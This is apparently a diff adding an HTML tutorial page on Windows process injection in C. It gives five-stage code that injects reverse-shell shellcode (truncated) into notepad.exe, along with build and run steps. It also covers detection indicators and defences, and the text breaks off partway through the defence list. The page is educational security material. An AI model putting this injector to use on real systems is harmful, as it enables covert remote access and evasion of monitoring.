@@ -1,0 +1,1027 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Process Injection Demo — Security Research</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600&display=swap');
+
+  :root {
+    --bg:        #0D1117;
+    --bg2:       #161B22;
+    --bg3:       #1C2128;
+    --border:    #30363D;
+    --accent:    #3FB950;
+    --text:      #E6EDF3;
+    --muted:     #8B949E;
+    --red:       #F85149;
+    --yellow:    #D29922;
+    --cyan:      #00E5FF;
+    --purple:    #A78BFA;
+    --orange:    #F97316;
+    --code-bg:   #161B22;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Inter', sans-serif;
+    font-size: 15px;
+    line-height: 1.7;
+  }
+
+  .hero {
+    position: relative;
+    padding: 80px 40px 60px;
+    text-align: center;
+    border-bottom: 1px solid var(--border);
+    overflow: hidden;
+  }
+
+  .hero::before {
+    content: '';
+    position: absolute;
+    top: -100px; left: 50%;
+    transform: translateX(-50%);
+    width: 600px; height: 600px;
+    background: radial-gradient(circle, rgba(63,185,80,0.06) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+    margin-bottom: 20px;
+  }
+
+  .hero h1 {
+    font-size: clamp(28px, 5vw, 52px);
+    font-weight: 600;
+    line-height: 1.15;
+    max-width: 800px;
+    margin: 0 auto 20px;
+  }
+
+  .hero h1 span { color: var(--accent); }
+
+  .hero-sub {
+    color: var(--muted);
+    max-width: 560px;
+    margin: 0 auto 40px;
+    font-size: 16px;
+  }
+
+  .badge-row {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    padding: 4px 12px;
+    border-radius: 20px;
+    border: 1px solid var(--border);
+    color: var(--muted);
+  }
+
+  .badge.green  { border-color: var(--accent); color: var(--accent); }
+  .badge.red    { border-color: var(--red);    color: var(--red); }
+  .badge.cyan   { border-color: var(--cyan);   color: var(--cyan); }
+  .badge.yellow { border-color: var(--yellow); color: var(--yellow); }
+  .badge.orange { border-color: var(--orange); color: var(--orange); }
+
+  .page-layout {
+    display: grid;
+    grid-template-columns: 220px 1fr;
+    gap: 0;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 40px 24px;
+    align-items: start;
+  }
+
+  .sidebar {
+    position: sticky;
+    top: 24px;
+    padding-right: 32px;
+  }
+
+  .sidebar-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 12px;
+  }
+
+  .sidebar nav a {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 6px 10px;
+    border-radius: 6px;
+    color: var(--muted);
+    text-decoration: none;
+    font-size: 13px;
+    transition: all 0.15s;
+    margin-bottom: 2px;
+  }
+
+  .sidebar nav a:hover,
+  .sidebar nav a.active { background: var(--bg2); color: var(--text); }
+
+  .sidebar nav a .step-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--accent);
+    min-width: 18px;
+  }
+
+  .content section {
+    margin-bottom: 64px;
+    scroll-margin-top: 24px;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .step-badge {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent);
+    background: rgba(63,185,80,0.08);
+    border: 1px solid rgba(63,185,80,0.2);
+    padding: 4px 10px;
+    border-radius: 4px;
+    white-space: nowrap;
+  }
+
+  .section-header h2 { font-size: 20px; font-weight: 600; }
+
+  p { margin-bottom: 16px; color: #C9D1D9; }
+
+  .code-block {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin: 20px 0;
+    overflow: hidden;
+  }
+
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 10px 16px;
+    background: var(--bg3);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 1px;
+  }
+
+  .code-filename {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+  }
+
+  pre {
+    padding: 20px;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+  }
+
+  .kw  { color: #FF7B72; }
+  .str { color: #A5D6FF; }
+  .cmt { color: #8B949E; font-style: italic; }
+  .num { color: #F2CC60; }
+  .cls { color: #FFA657; }
+  .met { color: #D2A8FF; }
+  .typ { color: #79C0FF; }
+  .con { color: #3FB950; }
+
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    margin: 20px 0;
+  }
+
+  .steps li {
+    counter-increment: step;
+    display: grid;
+    grid-template-columns: 32px 1fr;
+    gap: 16px;
+    margin-bottom: 20px;
+    align-items: start;
+  }
+
+  .steps li::before {
+    content: counter(step);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--accent);
+    background: rgba(63,185,80,0.08);
+    border: 1px solid rgba(63,185,80,0.2);
+    width: 32px;
+    height: 32px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    margin-top: 2px;
+  }
+
+  .steps li .step-content strong {
+    display: block;
+    color: var(--text);
+    margin-bottom: 4px;
+    font-size: 14px;
+  }
+
+  .steps li .step-content p { margin: 0; font-size: 13px; }
+
+  .callout {
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin: 20px 0;
+    display: flex;
+    gap: 14px;
+    align-items: flex-start;
+    font-size: 14px;
+  }
+
+  .callout-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+  .callout.tip    { background: rgba(63,185,80,0.08);  border: 1px solid rgba(63,185,80,0.2);  }
+  .callout.warn   { background: rgba(210,153,34,0.08); border: 1px solid rgba(210,153,34,0.2); }
+  .callout.info   { background: rgba(0,229,255,0.06);  border: 1px solid rgba(0,229,255,0.15); }
+  .callout.danger { background: rgba(248,81,73,0.08);  border: 1px solid rgba(248,81,73,0.2);  }
+  .callout p { margin: 0; color: var(--text); }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 20px 0;
+    font-size: 13px;
+  }
+
+  th {
+    background: var(--bg3);
+    padding: 10px 16px;
+    text-align: left;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    letter-spacing: 1px;
+    color: var(--muted);
+    border-bottom: 1px solid var(--border);
+  }
+
+  td {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    color: #C9D1D9;
+  }
+
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: var(--bg2); }
+
+  td code, p code, li code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    padding: 1px 6px;
+    border-radius: 4px;
+    color: var(--accent);
+  }
+
+  .flow {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 24px;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    line-height: 2;
+  }
+
+  .flow-step {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 8px 12px;
+    border-radius: 6px;
+    margin-bottom: 4px;
+  }
+
+  .flow-step.stage1 { background: rgba(0,229,255,0.05);  border: 1px solid rgba(0,229,255,0.15); }
+  .flow-step.stage2 { background: rgba(63,185,80,0.05);  border: 1px solid rgba(63,185,80,0.15); }
+  .flow-step.stage3 { background: rgba(210,153,34,0.05); border: 1px solid rgba(210,153,34,0.15); }
+  .flow-step.stage4 { background: rgba(249,115,22,0.05); border: 1px solid rgba(249,115,22,0.15); }
+  .flow-step.stage5 { background: rgba(248,81,73,0.05);  border: 1px solid rgba(248,81,73,0.15); }
+
+  .flow-label { min-width: 160px; font-weight: 600; }
+  .flow-label.cyan   { color: var(--cyan); }
+  .flow-label.green  { color: var(--accent); }
+  .flow-label.yellow { color: var(--yellow); }
+  .flow-label.orange { color: var(--orange); }
+  .flow-label.red    { color: var(--red); }
+  .flow-desc { color: var(--muted); }
+  .flow-arrow { color: var(--muted); padding-left: 24px; font-size: 11px; }
+
+  .mitre-tag {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 4px;
+    border: 1px solid rgba(63,185,80,0.3);
+    color: var(--accent);
+    background: rgba(63,185,80,0.06);
+    display: inline-block;
+    margin: 2px;
+  }
+
+  .memory-diagram {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px 24px;
+    margin: 20px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+  }
+
+  .mem-block {
+    border: 1px solid var(--border);
+    padding: 10px 16px;
+    margin-bottom: 2px;
+    border-radius: 4px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .mem-block.injected {
+    border-color: rgba(248,81,73,0.4);
+    background: rgba(248,81,73,0.06);
+    color: var(--red);
+  }
+
+  .mem-block.normal { color: var(--muted); }
+  .mem-addr { color: var(--accent); font-size: 11px; }
+
+  .api-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin-bottom: 10px;
+    display: grid;
+    grid-template-columns: auto 1fr;
+    gap: 16px;
+    align-items: start;
+  }
+
+  .api-name {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    background: rgba(63,185,80,0.08);
+    border: 1px solid rgba(63,185,80,0.2);
+    padding: 4px 10px;
+    border-radius: 4px;
+    white-space: nowrap;
+  }
+
+  .api-desc { font-size: 13px; color: var(--muted); }
+  .api-header { font-size: 11px; color: var(--muted); margin-bottom: 2px; font-family: 'JetBrains Mono', monospace; }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 40px 24px;
+    text-align: center;
+    color: var(--muted);
+    font-size: 13px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  footer a { color: var(--accent); text-decoration: none; }
+
+  @media (max-width: 768px) {
+    .page-layout { grid-template-columns: 1fr; }
+    .sidebar { display: none; }
+    .hero { padding: 60px 20px 40px; }
+  }
+
+  section { opacity: 0; transform: translateY(16px); transition: opacity 0.4s, transform 0.4s; }
+  section.visible { opacity: 1; transform: none; }
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="hero-eyebrow">// Proof of Concept — Educational Research</div>
+  <h1>Windows<br><span>Process Injection</span><br>Demo</h1>
+  <p class="hero-sub">A five-stage walkthrough of classic process 
+injection in C — from process enumeration to remote thread execution 
+inside Notepad.exe.</p>
+  <div class="badge-row">
+    <span class="badge red">⚠ Educational Only</span>
+    <span class="badge cyan">C / Win32 API</span>
+    <span class="badge green">Visual Studio 2022</span>
+    <span class="badge yellow">x64 Windows</span>
+    <span class="badge orange">Shellcode</span>
+  </div>
+</div>
+
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <div class="sidebar-label">On this page</div>
+    <nav>
+      <a href="#overview" class="active"><span class="step-num">00</span> Overview</a>
+      <a href="#how-it-works"><span class="step-num">01</span> How It Works</a>
+      <a href="#stage1"><span class="step-num">02</span> Stage 1 — Enumerate</a>
+      <a href="#stage2"><span class="step-num">03</span> Stage 2 — Open Handle</a>
+      <a href="#stage3"><span class="step-num">04</span> Stage 3 — Allocate</a>
+      <a href="#stage4"><span class="step-num">05</span> Stage 4 — Write</a>
+      <a href="#stage5"><span class="step-num">06</span> Stage 5 — Execute</a>
+      <a href="#win32-apis"><span class="step-num">07</span> Win32 APIs</a>
+      <a href="#build"><span class="step-num">08</span> Build &amp; Run</a>
+      <a href="#detection"><span class="step-num">09</span> Detection</a>
+      <a href="#defence"><span class="step-num">10</span> Defence</a>
+      <a href="#mitre"><span class="step-num">11</span> MITRE ATT&amp;CK</a>
+    </nav>
+  </aside>
+
+  <main class="content">
+
+    <!-- OVERVIEW -->
+    <section id="overview" class="visible">
+      <div class="section-header">
+        <span class="step-badge">00</span>
+        <h2>Overview</h2>
+      </div>
+
+      <div class="callout danger">
+        <span class="callout-icon">⚠️</span>
+        <p><strong>Educational purpose only.</strong> This is a 
+proof-of-concept for security research and learning. Unauthorised 
+process injection is illegal under the Computer Misuse Act. Only use in 
+controlled lab environments on systems you own or have explicit written 
+permission to test.</p>
+      </div>
+
+      <p>Process injection is a technique where executable code is 
+forcibly loaded into the address space of another running process. Once 
+injected, the code runs with that process's privileges and identity — 
+making detection significantly harder since all activity appears to come
+ from a legitimate process like Notepad.</p>
+
+      <p>This demo implements the classic five-stage injection pattern in C using the Windows API, targeting <code>notepad.exe</code> as the victim process. The injected shellcode opens a reverse shell on port 4444.</p>
+
+      <div class="callout info">
+        <span class="callout-icon">🔗</span>
+        <p><strong>Source code on GitHub.</strong> Full C source, Visual Studio solution, and project files: <a href="https://github.com/Cupcakeatemytaser/Process_Injection_Demo" style="color: var(--accent);">github.com/Cupcakeatemytaser/Process_Injection_Demo ↗</a></p>
+      </div>
+    </section>
+
+    <!-- HOW IT WORKS -->
+    <section id="how-it-works">
+      <div class="section-header">
+        <span class="step-badge">01</span>
+        <h2>How It Works</h2>
+      </div>
+
+      <p>The injection follows five sequential stages. Each stage uses a
+ specific Win32 API call, and each must succeed before the next can 
+proceed.</p>
+
+      <div class="flow">
+        <div class="flow-step stage1">
+          <span class="flow-label cyan">Stage 1</span>
+          <span class="flow-desc">CreateToolhelp32Snapshot — enumerate all running processes, find notepad.exe PID</span>
+        </div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step stage2">
+          <span class="flow-label green">Stage 2</span>
+          <span class="flow-desc">OpenProcess(PROCESS_ALL_ACCESS) — get a handle to the target process</span>
+        </div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step stage3">
+          <span class="flow-label yellow">Stage 3</span>
+          <span class="flow-desc">VirtualAllocEx(PAGE_EXECUTE_READWRITE) — allocate executable memory inside notepad</span>
+        </div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step stage4">
+          <span class="flow-label orange">Stage 4</span>
+          <span class="flow-desc">WriteProcessMemory — copy shellcode bytes into the allocated memory</span>
+        </div>
+        <div class="flow-arrow">↓</div>
+        <div class="flow-step stage5">
+          <span class="flow-label red">Stage 5</span>
+          <span class="flow-desc">CreateRemoteThread — start a new thread in notepad pointing at the shellcode</span>
+        </div>
+      </div>
+
+      <p>At the end of stage 5, the shellcode runs inside <code>notepad.exe</code> with notepad's security context, privileges, and identity — the reverse shell connection appears to originate from Notepad.</p>
+    </section>
+
+    <!-- STAGE 1 -->
+    <section id="stage1">
+      <div class="section-header">
+        <span class="step-badge">02</span>
+        <h2>Stage 1 — Process Enumeration</h2>
+      </div>
+
+      <p>Before injecting, the code needs the Process ID (PID) of the 
+target. Rather than hardcoding a PID — which changes every run — it 
+enumerates all running processes dynamically.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">InjDemo.c — process enumeration</span>
+          <span class="code-lang">C</span>
+        </div>
+        <pre><span class="cmt">// Take a snapshot of all running processes</span>
+<span class="cls">HANDLE</span> hSnapshot = <span class="met">CreateToolhelp32Snapshot</span>(<span class="con">TH32CS_SNAPPROCESS</span>, <span class="num">0</span>);
+
+<span class="cls">PROCESSENTRY32W</span> pe32;
+pe32.dwSize = <span class="kw">sizeof</span>(<span class="cls">PROCESSENTRY32W</span>);
+
+<span class="cmt">// Iterate through every running process</span>
+<span class="kw">while</span> (<span class="met">Process32NextW</span>(hSnapshot, &amp;pe32)) {
+    <span class="kw">if</span> (!<span class="met">_wcsicmp</span>(pe32.szExeFile, L<span class="str">"notepad.exe"</span>)) {
+        remote_pid = pe32.th32ProcessID;  <span class="cmt">// found it</span>
+        <span class="kw">break</span>;
+    }
+}
+<span class="met">CloseHandle</span>(hSnapshot);</pre>
+      </div>
+
+      <p><code>TH32CS_SNAPPROCESS</code> creates a snapshot of all processes. <code>_wcsicmp</code> does a case-insensitive wide-string comparison so <code>Notepad.EXE</code> and <code>notepad.exe</code> both match. If notepad isn't found <code>remote_pid</code> stays 0 and later stages fail gracefully.</p>
+    </section>
+
+    <!-- STAGE 2 -->
+    <section id="stage2">
+      <div class="section-header">
+        <span class="step-badge">03</span>
+        <h2>Stage 2 — Open Process Handle</h2>
+      </div>
+
+      <p>With the PID found, the code opens a handle to the process. The
+ handle is required for every subsequent API call that interacts with 
+notepad's memory or threads.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">InjDemo.c — open handle</span>
+          <span class="code-lang">C</span>
+        </div>
+        <pre><span class="cls">HANDLE</span> hProcess = <span class="met">OpenProcess</span>(
+    <span class="con">PROCESS_ALL_ACCESS</span>,  <span class="cmt">// full read/write/execute permissions</span>
+    <span class="con">TRUE</span>,                <span class="cmt">// handle is inheritable</span>
+    remote_pid           <span class="cmt">// target PID found in Stage 1</span>
+);
+
+<span class="kw">if</span> (hProcess) {
+    <span class="cmt">// Handle opened — continue to Stage 3</span>
+} <span class="kw">else</span> {
+    <span class="cmt">// Access denied — insufficient privileges</span>
+}</pre>
+      </div>
+
+      <div class="callout warn">
+        <span class="callout-icon">⚠️</span>
+        <p><strong>Requires matching or elevated privileges.</strong> <code>PROCESS_ALL_ACCESS</code> will fail if the injector runs with lower privileges than the target process. Run as Administrator to ensure this succeeds.</p>
+      </div>
+    </section>
+
+    <!-- STAGE 3 -->
+    <section id="stage3">
+      <div class="section-header">
+        <span class="step-badge">04</span>
+        <h2>Stage 3 — Allocate Memory in Target</h2>
+      </div>
+
+      <p>Memory must be allocated inside notepad's address space to hold
+ the shellcode. Critically, it must be marked as executable — otherwise 
+the CPU will refuse to run it.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">InjDemo.c — memory allocation</span>
+          <span class="code-lang">C</span>
+        </div>
+        <pre><span class="cls">LPVOID</span> exec_mem = <span class="met">VirtualAllocEx</span>(
+    hProcess,                        <span class="cmt">// target process handle</span>
+    <span class="con">NULL</span>,                            <span class="cmt">// let Windows choose the address</span>
+    <span class="kw">sizeof</span>(shellcode),               <span class="cmt">// allocate exactly enough space</span>
+    <span class="con">MEM_COMMIT</span> | <span class="con">MEM_RESERVE</span>,       <span class="cmt">// reserve and commit immediately</span>
+    <span class="con">PAGE_EXECUTE_READWRITE</span>           <span class="cmt">// allow read, write AND execute</span>
+);</pre>
+      </div>
+
+      <p><code>PAGE_EXECUTE_READWRITE</code> is the critical flag — it 
+allows the region to be written (Stage 4) and then executed (Stage 5). 
+This combination is a major detection indicator since legitimate 
+applications rarely need memory that is both writable and executable 
+simultaneously.</p>
+
+      <div class="memory-diagram">
+        <div style="font-size: 11px; color: var(--muted); margin-bottom: 12px; letter-spacing: 1px;">NOTEPAD.EXE ADDRESS SPACE AFTER STAGE 3</div>
+        <div class="mem-block normal"><span>Original code (.text section)</span><span class="mem-addr">0x00400000</span></div>
+        <div class="mem-block normal"><span>Data / resources (.data)</span><span class="mem-addr">0x00600000</span></div>
+        <div class="mem-block normal"><span>Heap</span><span class="mem-addr">0x01000000</span></div>
+        <div class="mem-block injected"><span>⚠ Injected shellcode region (PAGE_EXECUTE_READWRITE)</span><span class="mem-addr">0x14000000</span></div>
+        <div class="mem-block normal"><span>Stack</span><span class="mem-addr">0x7FF00000</span></div>
+      </div>
+    </section>
+
+    <!-- STAGE 4 -->
+    <section id="stage4">
+      <div class="section-header">
+        <span class="step-badge">05</span>
+        <h2>Stage 4 — Write Shellcode</h2>
+      </div>
+
+      <p>The shellcode bytes are copied from the injector process into 
+the allocated memory region inside notepad. This crosses the process 
+boundary — writing into another process's memory space.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">InjDemo.c — write shellcode</span>
+          <span class="code-lang">C</span>
+        </div>
+        <pre><span class="cmt">// x64 reverse shell shellcode (~300 bytes, hex-encoded)</span>
+<span class="kw">unsigned char</span> shellcode[] =
+    <span class="str">"\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff"</span>
+    <span class="str">"\x48\x8d\x05\xef\xff\xff\xff\x48\xbb..."</span>;  <span class="cmt">// truncated</span>
+
+<span class="cmt">// Copy shellcode into notepad's allocated memory</span>
+<span class="met">WriteProcessMemory</span>(
+    hProcess,           <span class="cmt">// target process handle</span>
+    exec_mem,           <span class="cmt">// destination address (from Stage 3)</span>
+    shellcode,          <span class="cmt">// source — our shellcode bytes</span>
+    <span class="kw">sizeof</span>(shellcode),  <span class="cmt">// number of bytes to write</span>
+    <span class="con">NULL</span>                <span class="cmt">// bytes written (optional output)</span>
+);</pre>
+      </div>
+
+      <p>The shellcode is position-independent (PIC) — it works 
+regardless of where in memory it lands, since it resolves all API 
+addresses dynamically at runtime rather than relying on fixed addresses.</p>
+    </section>
+
+    <!-- STAGE 5 -->
+    <section id="stage5">
+      <div class="section-header">
+        <span class="step-badge">06</span>
+        <h2>Stage 5 — Remote Thread Execution</h2>
+      </div>
+
+      <p>The final step creates a new thread inside notepad.exe whose 
+entry point is the injected shellcode. From this point the shellcode 
+runs autonomously inside notepad with notepad's full privileges.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">InjDemo.c — create remote thread</span>
+          <span class="code-lang">C</span>
+        </div>
+        <pre><span class="cls">HANDLE</span> hThread = <span class="met">CreateRemoteThread</span>(
+    hProcess,                              <span class="cmt">// target process</span>
+    <span class="con">NULL</span>,                                  <span class="cmt">// default security attributes</span>
+    <span class="num">0</span>,                                     <span class="cmt">// default stack size</span>
+    (<span class="cls">LPTHREAD_START_ROUTINE</span>)exec_mem,      <span class="cmt">// entry point = our shellcode</span>
+    <span class="con">NULL</span>,                                  <span class="cmt">// no parameter</span>
+    <span class="num">0</span>,                                     <span class="cmt">// run immediately</span>
+    <span class="con">NULL</span>                                   <span class="cmt">// thread ID (not needed)</span>
+);
+
+<span class="cmt">// Shellcode now running inside notepad.exe</span>
+<span class="cmt">// Reverse shell opens on port 4444</span>
+<span class="met">CloseHandle</span>(hThread);
+<span class="met">CloseHandle</span>(hProcess);</pre>
+      </div>
+
+      <div class="callout tip">
+        <span class="callout-icon">✅</span>
+        <p><strong>Expected output.</strong> The console prints the PID 
+of notepad, confirms each stage succeeded, then prints "Shell Opened on 
+Port 4444". The reverse shell connection appears in network logs as 
+originating from <code>notepad.exe</code>.</p>
+      </div>
+    </section>
+
+    <!-- WIN32 APIs -->
+    <section id="win32-apis">
+      <div class="section-header">
+        <span class="step-badge">07</span>
+        <h2>Win32 APIs Used</h2>
+      </div>
+
+      <div class="api-card">
+        <span class="api-name">CreateToolhelp32Snapshot</span>
+        <div>
+          <div class="api-header">tlhelp32.h</div>
+          <div class="api-desc">Creates a snapshot of all running processes, threads, modules, or heaps. Used here with <code>TH32CS_SNAPPROCESS</code> to enumerate every process and find notepad's PID.</div>
+        </div>
+      </div>
+
+      <div class="api-card">
+        <span class="api-name">OpenProcess</span>
+        <div>
+          <div class="api-header">processthreadsapi.h</div>
+          <div class="api-desc">Opens a handle to an existing process. <code>PROCESS_ALL_ACCESS</code> grants full read, write, and execute permissions. Requires the caller to have matching or higher privileges than the target.</div>
+        </div>
+      </div>
+
+      <div class="api-card">
+        <span class="api-name">VirtualAllocEx</span>
+        <div>
+          <div class="api-header">memoryapi.h</div>
+          <div class="api-desc">Allocates memory in the virtual address space of another process. The <code>PAGE_EXECUTE_READWRITE</code> flag is the key indicator — legitimate code rarely needs memory that is simultaneously writable and executable.</div>
+        </div>
+      </div>
+
+      <div class="api-card">
+        <span class="api-name">WriteProcessMemory</span>
+        <div>
+          <div class="api-header">memoryapi.h</div>
+          <div class="api-desc">Writes data into the memory of another 
+process. Used here to copy shellcode bytes from the injector into the 
+allocated region inside notepad. Crosses the process memory boundary.</div>
+        </div>
+      </div>
+
+      <div class="api-card">
+        <span class="api-name">CreateRemoteThread</span>
+        <div>
+          <div class="api-header">processthreadsapi.h</div>
+          <div class="api-desc">Creates a thread in the virtual address 
+space of another process. The thread entry point is set to the injected 
+shellcode address — this is the trigger that starts execution.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- BUILD -->
+    <section id="build">
+      <div class="section-header">
+        <span class="step-badge">08</span>
+        <h2>Build &amp; Run</h2>
+      </div>
+
+      <div class="callout warn">
+        <span class="callout-icon">⚠️</span>
+        <p><strong>Run in an isolated VM only.</strong> The shellcode 
+opens a real reverse shell. Only execute in an air-gapped lab 
+environment. Antivirus will likely flag or block the compiled 
+executable.</p>
+      </div>
+
+      <h3 style="font-size: 15px; margin: 20px 0 12px; color: var(--text);">Build with Visual Studio</h3>
+      <ol class="steps">
+        <li>
+          <div class="step-content">
+            <strong>Open the solution</strong>
+            <p>Open <code>Project1.sln</code> in Visual Studio 2022 or later.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Select x64 configuration</strong>
+            <p>Set the build to <strong>x64</strong> — the shellcode is 64-bit and will fail on a 32-bit build. Choose Debug or Release.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Build the solution</strong>
+            <p>Press <strong>Ctrl+Shift+B</strong>. Output goes to <code>Project1\x64\Debug\</code> or <code>Project1\x64\Release\</code>.</p>
+          </div>
+        </li>
+      </ol>
+
+      <h3 style="font-size: 15px; margin: 20px 0 12px; color: var(--text);">Build from command line</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">Developer Command Prompt</span>
+          <span class="code-lang">CMD</span>
+        </div>
+        <pre>cd Process_Injection_Demo
+msbuild Project1.sln /p:Configuration=Release /p:Platform=x64</pre>
+      </div>
+
+      <h3 style="font-size: 15px; margin: 20px 0 12px; color: var(--text);">Running the demo</h3>
+      <ol class="steps">
+        <li>
+          <div class="step-content">
+            <strong>Open Notepad first</strong>
+            <p>Launch <code>notepad.exe</code> before running the injector — the enumeration in Stage 1 will fail if notepad isn't running.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Run as Administrator</strong>
+            <p>Right-click the compiled EXE → <strong>Run as administrator</strong>. Required for <code>PROCESS_ALL_ACCESS</code> to succeed.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Press Enter at each stage</strong>
+            <p>The demo pauses at each stage so you can observe the output and inspect the process in Task Manager or Process Hacker.</p>
+          </div>
+        </li>
+      </ol>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-filename">Expected console output</span>
+          <span class="code-lang">Output</span>
+        </div>
+        <pre>svchost.exe
+explorer.exe
+notepad.exe
+chrome.exe
+
+    Process ID of Notepad.exe is: 5432
+
+    Handle 0x4a5 to process opened successfully!!
+
+    Memory at address 0x140000000 in process Notepad allocated successfully!!
+
+    300 bytes of Shellcode injected at memory address 0x140000000 successfully!!
+
+    Shell Opened on Port 4444</pre>
+      </div>
+    </section>
+
+    <!-- DETECTION -->
+    <section id="detection">
+      <div class="section-header">
+        <span class="step-badge">09</span>
+        <h2>Detection</h2>
+      </div>
+
+      <p>Despite the evasion benefits, process injection leaves detectable traces at every stage:</p>
+
+      <table>
+        <thead>
+          <tr><th>Stage</th><th>Indicator</th><th>Detection method</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Stage 2</td><td><code>OpenProcess(PROCESS_ALL_ACCESS)</code> from unexpected caller</td><td>EDR API hooking, Sysmon Event ID 10</td></tr>
+          <tr><td>Stage 3</td><td><code>VirtualAllocEx</code> with <code>PAGE_EXECUTE_READWRITE</code></td><td>Memory scanning, EDR behavioural rules</td></tr>
+          <tr><td>Stage 4</td><td><code>WriteProcessMemory</code> into a running process</td><td>Sysmon, kernel callbacks</td></tr>
+          <tr><td>Stage 5</td><td><code>CreateRemoteThread</code> with entry point outside module bounds</td><td>EDR, Sysmon Event ID 8</td></tr>
+          <tr><td>Post-injection</td><td>Network connection from <code>notepad.exe</code> to port 4444</td><td>Network monitoring, firewall logs</td></tr>
+          <tr><td>Post-injection</td><td>Thread in notepad with entry point not in any loaded DLL</td><td>Memory forensics, Process Hacker</td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout tip">
+        <span class="callout-icon">🔍</span>
+        <p><strong>Sysmon is your friend.</strong> Sysmon Event ID 8 
+(CreateRemoteThread) and Event ID 10 (ProcessAccess) will both fire 
+during this injection. Forwarding these to a SIEM gives you 
+near-real-time detection of this technique.</p>
+      </div>
+    </section>
+
+    <!-- DEFENCE -->
+    <section id="defence">
+      <div class="section-header">
+        <span class="step-badge">10</span>
+        <h2>Defence</h2>
+      </div>
+
+      <ol class="steps">
+        <li>
+          <div class="step-content">
+            <strong>Deploy an EDR solution</strong>
+            <p>Modern EDR products hook the Win32 APIs used in this demo — <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> — and alert or block based on behavioural patterns.</p>
+          </div>
+        </li>
+        <li>
+          <div class="step-content">
+            <strong>Enable Data Execution Prevention (DEP)</strong>
